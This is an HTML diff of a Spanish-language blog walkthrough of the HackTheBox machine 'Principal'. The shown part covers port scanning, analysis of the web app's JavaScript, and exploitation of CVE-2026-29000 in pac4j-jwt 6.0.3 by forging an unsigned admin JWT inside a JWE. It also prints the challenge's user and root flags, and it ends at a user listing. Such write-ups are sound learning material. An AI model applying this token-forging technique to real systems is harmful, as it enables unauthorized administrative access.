@@ -1,19 +1,4 @@
-<!DOCTYPE html>
-<html lang="es">
-
-<head>
-  <title>
-  Principal · 0xjustgr0w
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
-
-
-
-
-<meta name="author" content="David León">
-<meta name="description" content="
+<!doctype html><html lang=es><head><title>Principal · 0xjustgr0w</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="David León"><meta name=description content="
   Principal — Intrusión Completa
   
     
@@ -43,366 +28,110 @@ Comenzamos con un ping para verificar conectividad y estimar el sistema operativ
 ❯ ping -c1 10.129.30.182
 PING 10.129.30.182 (10.129.30.182) 56(84) bytes of data.
 64 bytes from 10.129.30.182: icmp_seq=1 ttl=63 time=450 ms
-TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:">
-<meta name="keywords" content="blog,hacking,personal">
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Principal">
-  <meta name="twitter:description" content="Principal — Intrusión CompletaLink to headingDificultad: Medium
+TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:"><meta name=keywords content="blog,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Principal"><meta name=twitter:description content="Principal — Intrusión CompletaLink to headingDificultad: Medium
 Plataforma: HackTheBox
 Flags: 0f556e2c6de811d6afe3be60c3654a8e (user) / fe347d72e5fb53a7386c23dfab4c1b4f (root)
 ReconocimientoLink to headingDescubrimiento de puertosLink to headingComenzamos con un ping para verificar conectividad y estimar el sistema operativo basándonos en el TTL:
-❯ ping -c1 10.129.30.182 PING 10.129.30.182 (10.129.30.182) 56(84) bytes of data. 64 bytes from 10.129.30.182: icmp_seq=1 ttl=63 time=450 ms TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:">
-
-<meta property="og:url" content="https://justgr0w.github.io/posts/principal/">
-  <meta property="og:site_name" content="0xjustgr0w">
-  <meta property="og:title" content="Principal">
-  <meta property="og:description" content="Principal — Intrusión CompletaLink to headingDificultad: Medium
+❯ ping -c1 10.129.30.182 PING 10.129.30.182 (10.129.30.182) 56(84) bytes of data. 64 bytes from 10.129.30.182: icmp_seq=1 ttl=63 time=450 ms TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:"><meta property="og:url" content="https://justgr0w.github.io/posts/principal/"><meta property="og:site_name" content="0xjustgr0w"><meta property="og:title" content="Principal"><meta property="og:description" content="Principal — Intrusión CompletaLink to headingDificultad: Medium
 Plataforma: HackTheBox
 Flags: 0f556e2c6de811d6afe3be60c3654a8e (user) / fe347d72e5fb53a7386c23dfab4c1b4f (root)
 ReconocimientoLink to headingDescubrimiento de puertosLink to headingComenzamos con un ping para verificar conectividad y estimar el sistema operativo basándonos en el TTL:
-❯ ping -c1 10.129.30.182 PING 10.129.30.182 (10.129.30.182) 56(84) bytes of data. 64 bytes from 10.129.30.182: icmp_seq=1 ttl=63 time=450 ms TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:">
-  <meta property="og:locale" content="es">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-06-19T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-06-19T00:00:00+00:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="Medium">
-    <meta property="article:tag" content="HackTheBox">
-    <meta property="article:tag" content="Pac4j-Jwt">
-    <meta property="article:tag" content="SSH CA">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/abducted/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/variatype/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/snapped/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/cap/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/puppy/">
-
-
-
-
-<link rel="canonical" href="https://justgr0w.github.io/posts/principal/">
-
-
-<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css" integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin="anonymous" media="screen" />
-
-
-
-
-
-
-  
-    
-    
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
-  
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
-</head>
-
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="https://justgr0w.github.io/">
-      0xjustgr0w
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
-        
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/contact/">Sobre mí</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/posts/">Blog</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/projects/">Proyectos</a>
-            </li>
-          
-        
-        
-      </ul>
-    
-  </section>
-</nav>
-
-
-    <div class="content">
-      
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">
-            <a class="title-link" href="https://justgr0w.github.io/posts/principal/">
-              Principal
-            </a>
-          </h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
-              <time datetime="2026-06-19T00:00:00Z">
-                junio 19, 2026
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              8 minutos de lectura.
-            </span>
-          </div>
-          <div class="authors">
-  <i class="fa-solid fa-user" aria-hidden="true"></i>
-    <a href="/authors/0xjustgr0w/">0xjustgr0w</a></div>
-
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="/categories/pentesting/">Pentesting</a></div>
-
-          <div class="tags">
-  <i class="fa-solid fa-tag" aria-hidden="true"></i>
-    <span class="tag">
-      <a href="/tags/ctf/">CTF</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/medium/">Medium</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/hackthebox/">HackTheBox</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/pac4j-jwt/">Pac4j-Jwt</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/ssh-ca/">SSH CA</a>
-    </span></div>
-
-        </div>
-      </header>
-
-      <div class="post-content">
-        
-        <h1 id="principal--intrusión-completa">
-  Principal — Intrusión Completa
-  <a class="heading-link" href="#principal--intrusi%c3%b3n-completa">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h1>
-<p><img src="/images/posts/principal/target.png" alt=""></p>
-<p><strong>Dificultad</strong>: <em>Medium</em></p>
-<p><strong>Plataforma</strong>: <em>HackTheBox</em></p>
-<p><strong>Flags</strong>: <code>0f556e2c6de811d6afe3be60c3654a8e</code> (user) / <code>fe347d72e5fb53a7386c23dfab4c1b4f</code> (root)</p>
-<hr>
-<h2 id="reconocimiento">
-  Reconocimiento
-  <a class="heading-link" href="#reconocimiento">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<h3 id="descubrimiento-de-puertos">
-  Descubrimiento de puertos
-  <a class="heading-link" href="#descubrimiento-de-puertos">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>Comenzamos con un ping para verificar conectividad y estimar el sistema operativo basándonos en el TTL:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span>
-</span></span><span class="line"><span class="cl"><span class="no">PING</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">450</span> <span class="n">ms</span></span></span></code></pre></div>
-<p>TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span> <span class="o">-</span><span class="n">oG</span> <span class="n">nmap</span><span class="o">/</span><span class="n">targeted</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span>
-</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">99</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">49</span> <span class="o">-</span><span class="mo">0400</span>
-</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span>
-</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">48</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">48905</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">16628</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>
-</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>
-</span></span><span class="line"><span class="cl"><span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">proxy</span></span></span></code></pre></div>
-<p>Solo dos puertos abiertos: <strong>SSH (22)</strong> y un <strong>HTTP proxy (8080)</strong>. Vamos a profunzidar en los servicios:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">8080</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">oN</span> <span class="n">nmap</span><span class="o">/</span><span class="n">targeted</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span>
-</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span>
-</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">27</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>    <span class="no">VERSION</span>
-</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>        <span class="no">OpenSSH</span> <span class="mi">9</span><span class="o">.</span><span class="mi">6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu13</span><span class="o">.</span><span class="mi">14</span>
-</span></span><span class="line"><span class="cl"><span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">proxy</span> <span class="no">Jetty</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title</span><span class="p">:</span> <span class="no">Principal</span> <span class="no">Internal</span> <span class="no">Platform</span> <span class="o">-</span> <span class="no">Login</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header</span><span class="p">:</span> <span class="no">Jetty</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="ss">proxy</span><span class="p">:</span> <span class="no">Proxy</span> <span class="n">might</span> <span class="n">be</span> <span class="n">redirecting</span> <span class="n">requests</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="ss">By</span><span class="p">:</span> <span class="n">pac4j</span><span class="o">-</span><span class="n">jwt</span><span class="o">/</span><span class="mi">6</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">3</span></span></span></code></pre></div>
-<p>Interesante — <strong>Jetty</strong> (servidor Java) con <strong>pac4j-jwt/6.0.3</strong> como motor de autenticación. Agregamos el host a <code>/etc/hosts</code> y exploramos el portal:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&#34;10.129.30.182</span><span class="se">\t\t</span><span class="s2">principal.htb&#34;</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="sr">/etc/</span><span class="n">hosts</span></span></span></code></pre></div>
-<h3 id="reconocimiento-del-portal-web">
-  Reconocimiento del portal web
-  <a class="heading-link" href="#reconocimiento-del-portal-web">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">whatweb</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span>
-</span></span><span class="line"><span class="cl"><span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span> <span class="o">[</span><span class="mi">302</span> <span class="no">Found</span><span class="o">]</span> <span class="no">RedirectLocation</span><span class="o">[</span><span class="sr">/login], X-Powered-By[pac4j-jwt/</span><span class="mi">6</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">3</span><span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">login</span> <span class="o">[</span><span class="mi">200</span> <span class="no">OK</span><span class="o">]</span> <span class="no">Title</span><span class="o">[</span><span class="no">Principal</span> <span class="no">Internal</span> <span class="no">Platform</span> <span class="o">-</span> <span class="no">Login</span><span class="o">]</span><span class="p">,</span> <span class="no">PasswordField</span><span class="o">[</span><span class="n">password</span><span class="o">]</span><span class="p">,</span> <span class="no">PoweredBy</span><span class="o">[</span><span class="n">pac4j</span><span class="o">]</span></span></span></code></pre></div>
-<p><img src="/images/posts/principal/Principal%20Login.png" alt=""></p>
-<p>Nos encontramos con un formulario de login de una plataforma interna llamada <strong>&ldquo;Principal Internal Platform&rdquo;</strong>. Probamos opciones básicas como SQLi, credenciales por defecto (admin:admin, admin:password), pero nada funciona. El botón de &ldquo;Forgot password?&rdquo; nos lleva a una página que dice que la función de reseteo <strong>no está implementada</strong>:</p>
-<p><img src="/images/posts/principal/reset%20password%20not%20implemented.png" alt=""></p>
-<p>Esto nos da una pista: si no hay reseteo de contraseña, probablemente el sistema espera que las credenciales sean gestionadas por un administrador. Pero antes de rendirnos, revisamos el código fuente de la página y encontramos algo mucho más interesante.</p>
-<h3 id="análisis-del-javascript">
-  Análisis del JavaScript
-  <a class="heading-link" href="#an%c3%a1lisis-del-javascript">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>En el archivo <code>/static/js/app.js</code> descubrimos los endpoints de la API y, crucialmente, <strong>cómo funciona el sistema de autenticación</strong>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/**
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Principal Internal Platform - Client Application
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Version: 1.2.0
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Authentication flow:
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. User submits credentials to /api/auth/login
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. Server returns encrypted JWT (JWE) token
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. Token is stored and sent as Bearer token for subsequent requests
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Token handling:
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * - Public key available at /api/auth/jwks for token verification
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * - Inner JWT is signed with RS256
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * JWT claims schema:
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *   sub   - username
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *   iss   - &#34;principal-platform&#34;
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *   iat   - issued at (epoch)
-</span></span></span><span class="line"><span class="cl"><span class="cm"> *   exp   - expiration (epoch)
-</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">API_BASE</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">JWKS_ENDPOINT</span> <span class="o">=</span> <span class="s1">&#39;/api/auth/jwks&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">AUTH_ENDPOINT</span> <span class="o">=</span> <span class="s1">&#39;/api/auth/login&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">DASHBOARD_ENDPOINT</span> <span class="o">=</span> <span class="s1">&#39;/api/dashboard&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">USERS_ENDPOINT</span> <span class="o">=</span> <span class="s1">&#39;/api/users&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">SETTINGS_ENDPOINT</span> <span class="o">=</span> <span class="s1">&#39;/api/settings&#39;</span><span class="p">;</span>
-</span></span></code></pre></div><p>Esto es oro puro. Sabemos que:</p>
-<ul>
-<li>Usa <strong>JWE</strong> (JSON Web Encryption) con <strong>RSA-OAEP-256</strong> y <strong>A128GCM</strong></li>
-<li>La clave pública está disponible en <code>/api/auth/jwks</code></li>
-<li>Los roles posibles son <code>ROLE_ADMIN</code>, <code>ROLE_MANAGER</code>, <code>ROLE_USER</code></li>
-<li>El endpoint <code>/api/users</code> lista usuarios (requiere autenticación)</li>
-<li>El endpoint <code>/api/settings</code> contiene ajustes de configuración</li>
-</ul>
-<p>Verificamos que los endpoints requieren autenticación:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">users</span> <span class="o">-</span><span class="n">i</span>
-</span></span><span class="line"><span class="cl"><span class="no">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">1</span> <span class="mi">401</span> <span class="no">Unauthorized</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="ss">:&#34;Unauthorized&#34;</span><span class="p">,</span><span class="s2">&#34;message&#34;</span><span class="ss">:&#34;Bearer token required&#34;</span><span class="p">}</span></span></span></code></pre></div>
-<p>Sin token no podemos hacer nada. Es momento de buscar vulnerabilidades en <strong>pac4j-jwt 6.0.3</strong>.</p>
-<hr>
-<h2 id="explotación">
-  Explotación
-  <a class="heading-link" href="#explotaci%c3%b3n">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<h3 id="cve-2026-29000--inyección-plainjwt-en-jwe">
-  CVE-2026-29000 — Inyección PlainJWT en JWE
-  <a class="heading-link" href="#cve-2026-29000--inyecci%c3%b3n-plainjwt-en-jwe">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>Investigando la versión <code>pac4j-jwt/6.0.3</code>, encontramos que es vulnerable a <strong>CVE-2026-29000</strong> con un CVSS de <strong>10.0</strong>. La vulnerabilidad permite inyectar un JWT sin firmar (PlainJWT) dentro de un JWE cifrado, de modo que el servidor confía en el contenido del token interno sin verificar la firma.</p>
-<p>El PoC es claro: el atacante obtiene la clave pública JWKS, construye un JWE con un payload JWT malicioso (cambiando el rol a <code>ROLE_ADMIN</code>), y el servidor lo acepta porque la vulnerabilidad impide la verificación correcta del encadenamiento JWT-dentro-de-JWE.</p>
-<p>Ejecutamos el exploit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python</span> <span class="no">CVE</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">29000</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">url</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span> <span class="o">--</span><span class="n">jwks</span> <span class="sr">/api/</span><span class="n">auth</span><span class="o">/</span><span class="n">jwks</span> <span class="o">--</span><span class="n">enc</span> <span class="no">A128GCM</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="err">██████╗██╗</span>   <span class="err">██╗███████╗</span>    <span class="err">██████╗</span>  <span class="err">██████╗</span> <span class="err">██████╗</span>  <span class="err">██████╗</span>
-</span></span><span class="line"><span class="cl"> <span class="err">██╔════╝██║</span>   <span class="err">██║██╔════╝</span>    <span class="err">╚════██╗██╔═══██╗╚════██╗██╔════╝</span>
-</span></span><span class="line"><span class="cl"> <span class="err">██║</span>     <span class="err">██║</span>   <span class="err">██║█████╗█████╗</span> <span class="err">█████╔╝██║</span>   <span class="err">██║</span> <span class="err">█████╔╝███████╗</span>
-</span></span><span class="line"><span class="cl"> <span class="err">██║</span>     <span class="err">╚██╗</span> <span class="err">██╔╝██╔══╝╚════╝██╔═══╝</span> <span class="err">██║</span>   <span class="err">██║██╔═══╝</span> <span class="err">██╔══██║</span>
-</span></span><span class="line"><span class="cl"> <span class="err">╚██████╗</span> <span class="err">╚████╔╝</span> <span class="err">███████╗</span>    <span class="err">███████╗╚██████╔╝███████╗╚██████╔╝</span>
-</span></span><span class="line"><span class="cl">  <span class="err">╚═════╝</span>  <span class="err">╚═══╝</span>  <span class="err">╚══════╝</span>    <span class="err">╚══════╝</span> <span class="err">╚═════╝</span> <span class="err">╚══════╝</span> <span class="err">╚═════╝</span>
-</span></span><span class="line"><span class="cl">    <span class="n">pac4j</span><span class="o">-</span><span class="n">jwt</span> <span class="no">PlainJWT</span><span class="o">-</span><span class="k">in</span><span class="o">-</span><span class="no">JWE</span>  <span class="o">|</span>  <span class="vg">$tr</span><span class="o">!</span><span class="n">k0d3r</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Target</span> <span class="p">:</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span>
-</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="no">Forged</span> <span class="no">JWE</span> <span class="ss">token</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"><span class="n">eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIiwiY3R5IjoiSldUIiwia2lkIjoiZW5jLWtleS0xIn0</span><span class="o">...</span></span></span></code></pre></div>
-<p>Obtenemos un token JWE forjado. Lo usamos para acceder a la plataforma como <strong>administrador</strong>.</p>
-<h3 id="reconocimiento-interno-con-acceso-de-administrador">
-  Reconocimiento interno con acceso de administrador
-  <a class="heading-link" href="#reconocimiento-interno-con-acceso-de-administrador">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>Con el token de administrador, comenzamos a explorar los endpoints protegidos.</p>
-<p><strong>Listado de usuarios — <code>/api/users</code>:</strong></p>
-<p><img src="/images/posts/principal/usernames.png" alt=""></p>
-<p>Descubrimos los siguientes usuarios registrados en la plataforma:</p>
-<pre tabindex="0"><code>jthompson
